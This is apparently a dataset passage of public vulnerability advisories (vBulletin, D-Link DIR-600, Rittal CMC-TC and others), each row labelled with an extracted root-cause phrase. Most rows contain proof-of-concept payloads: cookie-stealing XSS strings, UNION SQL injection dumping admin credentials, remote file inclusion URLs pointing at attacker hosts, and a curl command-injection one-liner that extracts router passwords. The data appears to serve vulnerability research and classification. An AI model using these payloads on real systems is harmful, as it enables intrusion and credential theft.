vulnerabilities and identifies what resources are exposed. It enables organizations to determine if current security investments are detecting and preventing attacks. Core Security Technologies augments its leading technology solution with world-class security consulting services, including penetration testing and software security auditing. Based in Boston, MA and Buenos Aires, Argentina, Core Security Technologies can be reached at 617-399-6980 or on the Web at http://www.coresecurity.com.   13. *Disclaimer*  The contents of this advisory are copyright (c) 2009 Core Security Technologies and (c) 2009 CoreLabs, and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.",an 'echo' statement in TestLink's database functions that directly outputs SQL errors back to the browser without escaping html entities,1
30047,"vBulletin 3.6.6 - 'calendar.php' HTML Injection source: https://www.securityfocus.com/bid/24020/info  vBulletin is prone to an HTML-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in dynamically generated content.  Attacker-supplied HTML and script code would run in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials and to control how the site is rendered to the user; other attacks are also possible.  Note that the attacker must have authenticated access to the affected application.  This issue is reported to affect vBulletin 3.6.6 and prior versions.    http://www.example.com/vbulletin/calendar.php?do=add&type=single&c=1 --> fill up the title field with : </title><script>alert(document.cookie)</script>",the application fails to properly sanitize user-supplied input before using it in dynamically generated content,1
27761,NeoMail - 'NeoMail.pl?sessionid' Cross-Site Scripting source: https://www.securityfocus.com/bid/17728/info  NeoMail is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  A successful exploit of this issue may grant an attacker full access to a victim user's NeoMail account.  http://www.example.com:2095/user+site.com/neomail.pl?sessionid=<script>alert(document.cookie)</script><!--,a failure in the application to properly sanitize user-supplied input,1
28292,"GeoClassifieds Enterprise 2.0.5.x - 'index.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/19196/info  GeoClassifieds Enterprise is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.   An attacker may leverage any of these issues to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  2.0.5.2 and prior versions are vulnerable; other versions may also be affected.  http://www.example.com/index.php?a=11&b=0&c=><script>alert(/EllipsisSecurityTest/)</script>&d=5 http://www.example.com/admin/index.php?b[username]=""><script>alert(/EllipsisSecurityTest/)</script>&b[password]=1 POST http://target.xx:80/index.php?a=10 HTTP/1.0 Host: www.example.com  Content-Type: application/x-www-form-urlencoded Content-Length: 115 b[username]=""><script>alert(/EllipsisSecurityTest/)</script>&b[password]2=1&submit=1 --- POST http://www.example.com:80/register.php?b=1 HTTP/1.0 Host: target.xx Content-Type: application/x-www-form-urlencoded Content-Length: 208 c[firstname]=1&c[lastname]=1&c[company_name]=1&c[business_type]=1&c[business_type]=1&c[address]=1&c[address_2]=1&c[city]= 1&c[zip]=1&c[phone]=""><script>alert(/EllipsisSecurityTest/)</script>",fails to properly sanitize user-supplied input,1
27743,"MySmartBB 1.1.2/1.1.3 - Multiple Input Validation Vulnerabilities source: https://www.securityfocus.com/bid/17707/info  MySmartBB is prone to multiple input-validation vulnerabilities. The issues include cross-site scripting and SQL-injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.   A successful exploit of these vulnerabilities could allow an attacker to compromise the application, access or modify data, steal cookie-based authentication credentials, or even exploit vulnerabilities in the underlying database implementation. Other attacks are also possible.  http://www.example.com/forums/misc.php?profile=1&id=[SQL]&[XSS] http://www.example.com/forums/misc.php?profile=1&username=[SQL]&[XSS]",a failure in the application to properly sanitize user-supplied input,1
33359,"PHD Help Desk 1.43 - 'caso_insert.php?URL' Cross-Site Scripting source: https://www.securityfocus.com/bid/37029/info       PHD Help Desk is prone to multiple cross-site scripting vulnerabilities because the application fails to sufficiently sanitize user-supplied data.       Attacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials; other attacks are also possible.       PHD Help Desk 1.43 is vulnerable; other versions may also be affected.   http://www.example.com/caso_insert.php/[code]",the application fails to sufficiently sanitize user-supplied data,1
22612,"ttCMS 2.2/2.3 - 'header.php' Remote File Inclusion source: https://www.securityfocus.com/bid/7625/info  A remote file include vulnerability has been reported for ttCMS. Due to insufficient sanitization of some user-supplied variables by the 'header.php' script, it is possible for a remote attacker to include a malicious PHP file in a URL.   http://target/admin/templates/header.php?admin_root=http://attacker/",insufficient sanitization of some user-supplied variables by the 'header.php' script,1
28426,"Headline Portal Engine 0.x/1.0 - 'HPEInc' Multiple Remote File Inclusions source: https://www.securityfocus.com/bid/19663/info  Multiple remote file-include vulnerabilities affect HPE because the application fails to properly sanitize user-supplied input before using it in a PHP 'include()' function call.   An attacker may leverage these issues to execute arbitrary server-side script code on an affected computer with the privileges of the webserver process.   These issues affect versions 1.0, 0.7.0, 0.6.5, and 0.6.1; other versions may also be vulnerable.  http://www.example.com/HPE/lang/de.php?HPEinc=http://cmd.gif? http://www.example.com/HPE/lang/fr.php?HPEinc=http://cmd.gif? http://www.example.com/HPE/clickerr.php3?HPEinc=http://cmd.gif? http://www.example.com/HPE/loadcatnews.php3?HPEinc=http://cmd.gif? http://www.example.com/HPE/motd.php3?HPEinc=http://cmd.gif? http://www.example.com/HPE/plugins/mod.news.php3?HPEinc=http://cmd.gif? http://www.example.com/HPE/plugins/mod.newslog.php3?HPEinc=http://cmd.gif? http://www.example.com/HPE/plugins/news.htmlnews.php3?HPEinc=http://cmd.gif? http://www.example.com/HPE/plugins/news.xmlbi.php3?HPEinc=http://cmd.gif? http://www.example.com/HPE/plugins/news.xmlphp.php3?HPEinc=http://cmd.gif? http://www.example.com/HPE/plugins/news.xmlphp.php3?HPEinc=http://cmd.gif? http://www.example.com/HPE/plugins/page.dmoz.show.php3?HPEinc=http://cmd.gif? http://www.example.com/HPE/thememaker.php3?HPEinc=http://cmd.gif? http://www.example.com/HPE/plugins/mod.news.php3?HPEinc=http://cmd.gif? http://www.example.com/HPE/plugins/news.htmlnews.php3?HPEinc=http://cmd.gif? http://www.example.com/HPE/plugins/news.xmlbi.php3?HPEinc=http://cmd.gif? http://www.example.com/HPE/plugins/news.xmlphp.php3?HPEinc=http://cmd.gif? http://www.example.com/HPE/plugins/page.dmoz.show.php3?HPEinc=http://cmd.gif? http://www.example.com/HPE/plugins/page.newnews.show.php3?HPEinc=http://cmd.gif? http://www.example.com/HPE/plugins/page.randnews.show.php3?HPEinc=http://cmd.gif? http://www.example.com/HPE/plugins/page.teaser.show.php3?HPEinc=http://cmd.gif? http://www.example.com/HPE/plugins/mod.news.php3?HPEinc=http://cmd.gif? http://www.example.com/HPE/plugins/news.htmlnews.php3?HPEinc=http://cmd.gif? http://www.example.com/HPE/plugins/news.xmlbi.php3?HPEinc=http://cmd.gif? http://www.example.com/HPE/plugins/news.xmlphp.php3?HPEinc=http://cmd.gif? http://www.example.com/HPE/plugins/page.dmoz.show.php3?HPEinc=http://cmd.gif? http://www.example.com/HPE/thememaker.php3?HPEinc=http://cmd.gif?",the application fails to properly sanitize user-supplied input before using it in a PHP 'include()' function call,1
24453,"D-Link DIR-600 / DIR-300 (Rev B) - Multiple Vulnerabilities Device Name: DIR-600 / DIR 300 - HW rev B1 Vendor: D-Link  ============ Vulnerable Firmware Releases - DIR-300: ============  Firmware Version : 2.12 - 18.01.2012 Firmware Version : 2.13 - 07.11.2012  ============ Vulnerable Firmware Releases - DIR-600: ============  Firmware-Version : 2.12b02 - 17/01/2012 Firmware-Version : 2.13b01 - 07/11/2012 Firmware-Version : 2.14b01 - 22/01/2013  ============ Device Description: ============  D-Link® introduces the Wireless 150 Router (DIR-600), which delivers high performance end-to-end wireless connectivity based on 802.11n technology. The DIR-600 provides better wireless coverage and improved speeds over standard 802.11g*. Upgrading your home network to Wireless 150 provides an excellent solution for experiencing better wireless performance while sharing a broadband Internet connection with multiple computers over a secure wireless network.  Source (dead): http://www.dlink.com/us/en/support/product/dir-600-wireless-n-150-home-r... German website: http://www.dlink.de/cs/Satellite?c=TechSupport_C&childpagename=DLinkEuro...  ============ Shodan Torks ============  Shodan search: Server: Linux, HTTP/1.1, DIR-300 Server: Linux, HTTP/1.1, DIR-600  ============ Vulnerability Overview: ============      * OS Command Injection (unauthenticated)   => Parameter cmd  The vulnerability is caused by missing access restrictions and missing input validation in the cmd parameter and can be exploited to inject and execute arbitrary shell commands. It is possible to start a telnetd to compromise the device.  WARNING: You do not need to be authenticated to the device!  Screenshot: http://www.s3cur1ty.de/sites/www.s3cur1ty.de/files/images/DIR-600-OS-Command-Injectino.png  starting a telnet server: Request: POST /command.php HTTP/1.1 Host: 192.168.178.222 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Proxy-Connection: keep-alive Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Referer: http://192.168.178.222/ Content-Length: 15 Cookie: uid=hfaiGzkB4z Pragma: no-cache Cache-Control: no-cache  cmd=telnetd;  You do not need to be authenticated to the device for executing the malicious commands. You could prepare the whole request and execute it without any authentication details.  For example you could start the telnetd on other ports and interfaces. So with this you are able to get a full shell *h00ray*  Nmap Scan after starting the telnetd: Nmap scan report for 192.168.178.222 Host is up (0.022s latency). Not shown: 995 closed ports PORT      STATE    SERVICE VERSION 1/tcp     filtered tcpmux 23/tcp    open     telnet  BusyBox telnetd 1.14.1 <<==!!! <snip>  Screenshot: http://www.s3cur1ty.de/sites/www.s3cur1ty.de/files/images/DIR-600-OS-Command-Injection-telnetd.png      * Information disclosure:   Nice server banner to detect this type of devices easily: Server: Linux, HTTP/1.1, DIR-300 Ver 2.12 Server: Linux, HTTP/1.1, DIR-600 Ver 2.12      * For changing the current password there is no request to the current password   With this vulnerability an attacker is able to change the current password without knowing it. The attacker needs access to an authenticated browser.      * Insecure Cryptographic Storage:   There is no password hashing implemented and so it is saved in plain text on the system: # cat var/passwd ""admin"" ""test"" ""0""  Positive Technologies has released an advisory in 2011 and D-Link has fixed this issue: http://en.securitylab.ru/lab/PT-2011-30 With the current version of the firmware the passwords are stored again in plaintext.  If you combine the plaintext credential vulnerability with the unauthenticated os command injection vulnerability you will get the following one liner to extract the admin password from every vulnerable device:  root@bt:~# curl --data ""cmd=cat /var/passwd"" http://<Target IP>/command.php ""admin"" ""THESECRETPASS"" ""0"" root@bt:~#      * Information Disclosure:   Detailed device information including Model Name, Hardware Version, Linux Kernel, Firmware version, Language and MAC Addresses are available via the network.  Request: http://Target-IP/DevInfo.txt  or try to access version.txt and have a look at the html source ;)  Response: HTTP/1.1 200 OK Server: Linux, HTTP/1.1, DIR-600 Ver 2.14 Date: Fri, 31 Dec 1999 18:04:13 GMT Content-Length: 267  Firmware External Version: V2.14 Firmware Internal Version: d1mg Model Name: DIR-600 Hardware Version: Bx WLAN Domain: 826 Kernel: 2.6.33.2 Language: en Graphcal Authentication: Disable LAN MAC: <snip> WAN MAC: <snip> WLAN MAC: <snip>  These details are available without authentication.      * Local path disclosure   Every piece of information is interesting for the attacker. With this we will get some more details about the operating system and its paths.  Request: http://<IP>/router_info.xml  Response: HTTP/1.1 200 OK Server: Linux, HTTP/1.1, DIR-300 Ver 2.12 Date: Sat, 01 Jan 2000 21:22:43 GMT Content-Type: text/xml Content-Length: 49  EPHP: dophp(load,/htdocs/widget/.xml) ERROR (-1)      * Stored XSS via WLAN Assistent and Version Details   Injecting scripts into the parameter SSID reveals that this parameter is not properly validated for malicious input.  => Parameter: SSID  The injected code gets executed if you try to access the file version.txt. For this you do not need to be authenticated :) http://Target-IP/version.txt  ============ Solution ============  No known solution available.  ============ Credits ============  The vulnerability was discovered by Michael Messner Mail: devnull#at#s3cur1ty#dot#de Web: http://www.s3cur1ty.de/m1adv2013-003 Video: http://www.s3cur1ty.de/home-network-horror-days  ============ Time Line: ============  14.12.2012 - discovered vulnerability 14.12.2012 - contacted dlink with the new vulnerability details via webinterface 20.12.2012 - contacted Heise Security with details and Heisec forwarded the details to D'Link 21.12.2012 - D'link responded that they will check the findings *h00ray* 11.01.2013 - requested status update 25.01.2013 - requested status update 25.01.2013 - D'Link responded that this is a security problem from the user and/or browser and they will not provide a fix. Quite interesting but ok ... 25.01.2013 - I gave more details and as much input as possible so they can evaluate the vulnerabilities better 04.02.2013 - no more responses from D'Link, public release  ===================== Advisory end =====================",missing access restrictions and missing input validation in the cmd parameter,1
33207,"SmartVMD 1.3 - ActiveX Control 'VideoMovementDetection.dll' Remote Buffer Overflow source: https://www.securityfocus.com/bid/36217/info  SmartVMD ActiveX control is prone to a buffer-overflow vulnerability because the application fails to adequately check boundaries on user-supplied input.  An attacker can exploit this issue to execute arbitrary code in the context of the application using the ActiveX control (typically Internet Explorer). Failed attacks will likely cause denial-of-service conditions.  SmartVMD 1.3 is vulnerable; other versions may also be affected.  <object classid='clsid:E3462D53-47A6-11D8-8EF6-DAE89272743C' id='test'></object> <input language=VBScript onclick=aidi() type=button value='test'> <script language='vbscript'> Sub aidi buff = String (9000, ""a"") test.StartVideoSaving (buff) End Sub </script>",the application fails to adequately check boundaries on user-supplied input,1
28125,"PHPClassifieds.Info - Multiple Input Validation Vulnerabilities source: https://www.securityfocus.com/bid/18713/info  The 'phpclassifieds.info' product is prone to multiple input-validation vulnerabilities. The issues include HTML- and SQL-injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.   Successful exploits of these vulnerabilities could allow an attacker to compromise the application, access or modify data, steal cookie-based authentication credentials, control how the site is rendered to the user, or exploit vulnerabilities in the underlying database implementation. Other attacks are also possible.  http://www.example.com/search.php?rate=[sql]",a failure in the application to properly sanitize user-supplied input,1
34317,"WS Interactive Automne 4.0 - '228-recherche.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/41686/info  Automne is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.  Automne version 4.0.0rc2 is vulnerable; other versions may also be affected.   http://www.example.com/web/fr/228-recherche.php?q=<input type=""Submit"" name=""Delete"" value=""ClickMe""onClick=""alert(1)"">",fails to properly sanitize user-supplied input,1
37617,"dirLIST 0.3.0 - Local File Inclusion source: https://www.securityfocus.com/bid/54933/info  dirLIST is prone to multiple local file-include vulnerabilities and an arbitrary-file upload vulnerability because the application fails to sufficiently sanitize user-supplied input.  An attacker can exploit these issues to upload arbitrary files onto the web server, execute arbitrary local files within the context of the web server, and obtain sensitive information.   http://www.example.com/dirlist_0.3.0/dirLIST_files/gallery_files/show_scaled_image.php?image_path=../../../../../windows/win.ini http://www.example.com/irlist_0.3.0/dirLIST_files/thumb_gen.php?image_path=../../../../../windows/win.ini",the application fails to sufficiently sanitize user-supplied input,1
37339,VoipNow Professional 2.5.3 - 'nsextt' Cross-Site Scripting source: https://www.securityfocus.com/bid/53759/info  VoipNow Professional is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  VoipNow Professional 2.5.3 is vulnerable; other versions may also be vulnerable.   http://www.example.com/index.php?nsextt=[xss],fails to properly sanitize user-supplied input,1
28568,"NX5Linkx 1.0 - 'links.php' HTTP Response Splitting source: https://www.securityfocus.com/bid/20011/info  NX5Linkx is prone to an HTTP response-splitting vulnerability because the application fails to properly sanitize user-supplied input.  A remote attacker may exploit this vulnerability to influence or misrepresent how web content is served, cached, or interpreted. This could aid in various attacks that attempt to entice client users into a false sense of trust.  http://www.example.com% 0D%0A%0D%0AHTTP/1.0 200 OK%0D%0A%0D% 0A.......",the application fails to properly sanitize user-supplied input,1
32309,"Full PHP Emlak Script - 'landsee.php' SQL Injection source: https://www.securityfocus.com/bid/30962/info  Full PHP Emlak Script is prone to an SQL-injection vulnerability because it fails to properly sanitize user-supplied input.  Attackers may exploit this issue to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/Script/landsee.php?id=-9+union+select+1,2,3,concat(username,0x3a,sifre),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75+FROM+admin--",fails to properly sanitize user-supplied input,1
32186,Quate CMS 0.3.4 - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/30570/info  Quate CMS is prone to multiple cross-site scripting vulnerabilities because it fails to adequately sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Quate CMS 0.3.4 is vulnerable; other versions may also be affected.   http://www.example.com/path/admin/includes/themes/default/header.php?page_area=[XSS] http://www.example.com/path/admin/includes/themes/default/header.php?page_header=[XSS],fails to adequately sanitize user-supplied input,1
27403,"WordPress Plugin Usernoise 3.7.8 - Persistent Cross-Site Scripting Details ============================= Application: Usernoise ( http://usernoise.karevn.com/ ) Version: 3.7.8 (probably earlier versions as well) Type: Wordpress plugin Developer: Nikolay Karev ( http://karevn.com/ - http://profiles.wordpress.org/karevn/) Vulnerability: Unauthorized persistent cross-site scripting  Description ================= Usernoise is a ""just works"" modal contact / feedback form. It became responsive starting from 3.5 release. You will not need to change even a line of code in your site.  Vulnerability ================= The summary field is vulnerable to persistent cross site scripting, and the affected area is the Wordpress admin dashboard. The reason why this vulnerability exists is because the user input is not being properly handled when a feedback is submitted. It accepts any type of arbitrary code, including JavaScript, and when the content is displayed in the feedback section in the dashboard, all JavaScript code is executed causing a sever vulnerability with administrators as the target.  Proof of Concept ================= <script>document.documentElement.innerHTML='RogueCoder was here';</script> Well done! Website looks great<script>console.log('RogueCoder was here');</script>  Solution ================= Upgrade to plugin version 3.7.9  Timeline ================= 2013-07-15 - Informed developer through plugin section on wordpress.org 2013-07-16 - Informed developer through email 2013-07-17 - Fix released",the user input is not being properly handled when a feedback is submitted,1
8269,"Rittal CMC-TC Processing Unit II - Multiple Vulnerabilities                           Louhi Networks Oy                        -= Security Advisory =-         Advisory: Rittal CMC-TC Processing Unit II                 multiple vulnerabilities   Release Date: 2009-03-23  Last Modified: 2009-03-22        Authors: Henri Lindberg, CISA                 [henri d0t lindberg at louhi d0t fi]     Application: Rittal CMC-TC PU II Web management         Devices: CMC-TC PU II DK 7320.100 SW: V2.45 HW: V3.01,                 possibly other Rittal products    Attack type : XSS Type I, XSS Type II, Session prediction,                 Remote command execution in default configuration       Severity: Moderate  Vendor Status: Vendor notified.                 Patch already available for XSS vulnerabilities.                 Other vulnerabilities will be addressed in a future                 version, no release date set.     References: http://www.louhinetworks.fi/advisory/Rittal_090323.txt   Overview:    Quote from http://www.rimatrix5.com/ :    ""The Computer Multi Control Top-Concept (CMC-TC) from Rittal is     a complete security management for preventive protection to guard     against consequential costs, and is the central organisational unit     for linking to the facility management.     ...     Processing Unit II (PU II) the nerve centre of the CMC-TC monitoring     system. The PU II is the coordinator between the sensor unit and the     network. It is configured via the integral Web server.""  Details:      Several vulnerabilities were identified from CMC-TC PU II web     interface. These include XSS Type I, XSS Type II, weak session     management and insecure default configuration.      XSS Type 1:     -----------     Web application fails to validate and/or htmlencode user input when     handling erroneous requests. This allows attacker to inject HTML and     client-side scripts to victim's browser by creating suitable links.      This vulnerability cannot be used for session hijacking, because     CMC-TC PU II requires each valid request to contain current session     ID as URL parameter. Requests without session ID are redirected to     the login page. Therefore only phishing-type attacks or attacks     against user's browser are possible.      Successful exploitation requires that attacker can lure or force     the user to follow the malicious link.      XSS Type 2:     -----------     Web application fails to sanitize and/or htmlencode user input on     system information page. This allows attacker to backdoor the device     with HTML and browser interpreted content (such as ECMAscript     dialects or other client-side scripts) as the content is displayed     always after login. Persistent XSS allows attacker to modify     displayed content or to change the victim's password (since old     password is not required for password changes).      Succesful exploitation requires access to the web management     interface either with valid credentials or hijacked session.      Weak session management:     ------------------------     CMC-TC PU II uses unixtime from login moment as session identifier,     thus having insufficient randomization.      If administrator login time is known and session is still valid, it     can be brute-forced with relatively little effort. Proof-of-concept     tool is provided, but any web application security tool (such as     Burp Intruder) can be used for this.      Successful exploitation requires that administrator login time is     known (or a reasonably accurate guess can be made) and the session     is still  active.      Insecure default configuration:     -------------------------------     If default administrator password is not changed, attacker can run     arbitrary commands and modify the system software by uploading     malicious  update scripts via ftp. See update packet script contents     for detailed information about the update process (eg update_l.sh).      Software update packet expects user to have default password     in place, since ftp-upload script contains hardcoded default     password. The update will fail with no errors if it's been changed.      What makes this interesting is the fact that the device does not     offer operating system level access through any of the other     management interfaces. Telnet and SSH both offer a menu based     administration interface.      Successful exploitation requires default administrator password and     access to ftp port of the target device.  Remediation:    * Restrict unauthorized network access to device    * Change default passwords (instructions provided in Operation      Manual)    * Install patched Version 2.60a    * Update future patch version as soon as available    * Configure web interface to 'view only'    * Review device configuration after an administrator has been let go    * Do not follow untrusted links  Timeline:    * 2008-xx-xx Issues discovered     * 2009-02-25 Contacted vendor via e-mail     * 2009-03-02 Contacted vendor via e-mail     * 2009-03-02 Vendor response.                 XSS vulnerabilities were already fixed independently.   http://www.rittal.de/downloads/Software/de/CMC_TC/18_update_processing_unit2/PU2_Update_v2.60a.zip  http://www.rittal.de/downloads/Software/en/CMC_TC/12_CMC_TC_Processing_unit/7320100V33e.pdf       Quote from vendor (sic):       ""thank you very much by the security information XXS.       We have seen, your customer has check the PUII SW V2.45.       Actual we have a better Version 2.60a with more seyurity.       Our XXS-Check of that Version is OK.       If you has by the basic more information for Rittal,       we are fine to get . ""     * 2009-03-02 Contacted vendor via e-mail requesting information about                 weak session management and public disclosure of XSS                 vulnerabilities.     * 2009-03-02 Discovered issues regarding default configuration from                 update packages     * 2009-03-16 Contacted vendor via e-mail requesting information                 regarding vulnerabilities and stating intent to release                 the advisory     * 2009-03-19 Vendor response. Promises to patch vulnerabilities in a                 future version.     * 2009-03-19 Contacted vendor via e-mail requesting release date for                 the update.     * 2009-03-20 Vendor response. Release date not set.     * 2009-03-20 Contacted vendor via e-mail stating intent to release                 the advisory. Delivered draft version of advisory.   Proof-of-Concept:  0) XSS Type 1 / Reflected  http://cmc.example.com/cmclogin.cgi?Fredo=%3Cscript%3Ealert('You%20broke%20my%20heart.You%20broke%20my%20heart');%3C/script%3E  http://cmc.example.com/cmcget.cgi?46010%3CSCRIPT%3Ealert('I%20know%20it%20was%20you.');%3C/SCRIPT%3E   1) XSS Type 2 / Persistent    Setup - General - Location: <script src=""http://l7.fi""></script>  1234567890 is the unixtime for administrator's login.  <html> <head><title>42</title></head> <body onload=""document.backdoor.submit()""> <form ACTION=http://1.1.1.1/cmcget.cgi?630101011234567890 METHOD=POST name=""backdoor"">   <input name=""p001"" value=""Initech Datacenter CMC-TC PU #42"">   <input name=""p002"" value=""Compton, LA county"">   <input name=""p003"" value=""servicedesk@initech.cpt"">   <input name=""p004"" value=""0"">   <input name=""p005"" value=""0"">   <input name=""p005"" value=""1"">   <input name=""p006"" value=""0"">   <input name=""p006"" value=""1"">   <input name=""p007"" value=""1"">   <input name=""p008"" value=""04.02.2000"">   <input name=""p009"" value=""04:20:00""> </form> </body> </html>  2) Session prediction  Proof-of-concept brute force tool available at http://www.louhinetworks.fi/advisory/Louhi_CMC-brute_090323.zip https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/8269.zip (2009-Louhi_CMC-brute_090323.zip)   Other information: * Default username and password is cmc * Default administrator username/password is admin * Device supports following protocols TCP/IP, SNMPv1, SNMPv3, FTP,   SFTP, SMTP, HTTPS, NTP, SSH, PPP, DHCP. Further research is   highly encouraged.   ""Six pints of bitter. And quickly please, the world's about to end.""  -- Ford Prefect  Copyright 2009 Louhi Networks Oy. All rights reserved. No warranties, no liabilities, information provided 'as is' for educational purposes. Reproduction allowed as long as credit is given. Information wants to be free.  # milw0rm.com [2009-03-23]",fails to validate and/or htmlencode user input when handling erroneous requests,1
27813,"CyberBuild - 'login.asp?sessionid' SQL Injection source: https://www.securityfocus.com/bid/17829/info  CyberBuild is prone to multiple input-validation vulnerabilities. The issues include cross-site scripting and SQL-injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.   A successful exploit of these vulnerabilities could allow an attacker to compromise the application, access or modify data, steal cookie-based authentication credentials, or even exploit vulnerabilities in the underlying database implementation. Other attacks are also possible.  http://www.example.com/login.asp?SessionID=[SQL]",a failure in the application to properly sanitize user-supplied input,1
32547,Extrakt Framework 0.7 - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/31971/info  Extrakt Framework is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  Extrakt Framework 0.7 is vulnerable; other versions may also be affected.   http://www.example.com/[SCRIPT_DIR]/index.php?plugins[file][id]=<script>alert(2008);</script>,fails to sufficiently sanitize,1
33465,SLAED CMS 2.0 - 'stop' Cross-Site Scripting source: https://www.securityfocus.com/bid/37574/info  SLAED CMS is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  SLAED CMS 2.0 is vulnerable; other versions may also be affected.   http://www.example.com/index.php?name=Recommend&stop=<ScRiPt+src=http://127.0.0.1/xss.js?213771818860></ScRiPt>,the application fails to properly sanitize user-supplied input,1
38922,AFCommerce - 'controlheader.php' Remote File Inclusion source: https://www.securityfocus.com/bid/64541/info    AFCommerce is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied input.    An attacker can exploit these vulnerabilities to obtain potentially sensitive information or to execute arbitrary script code in the context of the web server process. This may allow the attacker to compromise the application and the computer; other attacks are also possible.    http://www.example.com/afcontrol/controlheader.php?rootpathtocart=[RFI],fails to sufficiently sanitize user-supplied input,1
27457,"1WebCalendar 4.0 - 'mainCal.cfm' SQL Injection source: https://www.securityfocus.com/bid/17193/info    1WebCalendar is prone to multiple SQL-injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.     A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.  http://www.exampe.com/mainCal.cfm?=[code]",a failure in the application to properly sanitize user-supplied input before using it in SQL queries,1
33680,Open Educational System 0.1 Beta - 'CONF_INCLUDE_PATH' Multiple Remote File Inclusions source: https://www.securityfocus.com/bid/38449/info  Open Educational System is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.  Exploiting these issues may allow an attacker to compromise the application and the computer; other attacks are also possible.  Open Educational System 0.1 beta and prior versions are vulnerable.   http://www.example.com/[path]/admin/modules/modules/forum/admin.php?CONF_INCLUDE_PATH=attacker's site http://www.example.com/[path]/admin/modules/modules/plotgraph/index.php?CONF_INCLUDE_PATH=attacker's site http://www.example.com/[path]/admin/modules/user_account/admin_user/mod_admuser.php?CONF_INCLUDE_PATH=attacker's site http://www.example.com/[path]/admin/modules/user_account/ogroup/mod_group.php?CONF_INCLUDE_PATH=attacker's site,fails to sufficiently sanitize user-supplied data,1
29724,"MySQL 5.0.x - Single Row SubSelect Remote Denial of Service source: https://www.securityfocus.com/bid/22900/info  MySQL is prone to a remote denial-of-service vulnerability because it fails to handle certain select statements to database metadata.  An attacker can exploit this issue to crash the application, denying access to legitimate users. The attacker may also be able to execute arbitrary code, but this has not yet been confirmed.  NOTE: An attacker must be able to execute arbitrary SELECT statements on the vulnerable computer to exploit this issue. This may be through legitimate means or by exploiting other latent SQL-injection vulnerabilities.  Versions prior to 5.0.36 are vulnerable.   SELECT ASCII((SELECT table_name FROM information_schema.columns ORDER BY 1)); SELECT TRIM(LEADING FROM (SELECT table_name FROM information_schema.columns ORDER BY 1)); SELECT SUBSTR((SELECT table_name FROM information_schema.tables ORDER BY 1),1,1); SELECT UPPER((SELECT table_name FROM information_schema.tables ORDER BY 1)); SELECT RTRIM((SELECT table_name FROM information_schema.tables ORDER BY 1)); SELECT RPAD((SELECT table_name FROM information_schema.tables ORDER BY 1),1,'lol');",fails to handle certain select statements to database metadata,1
25262,"Interspire ArticleLive 2005 - NewComment Cross-Site Scripting source: https://www.securityfocus.com/bid/12879/info  Interspire ArticleLive 2005 is reportedly affected by a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.   http://www.example.com/articles/newcomment?ArticleId="">&lt;script&gt;alert('hi')&lt;/script&gt;",a failure in the application to properly sanitize user-supplied input,1
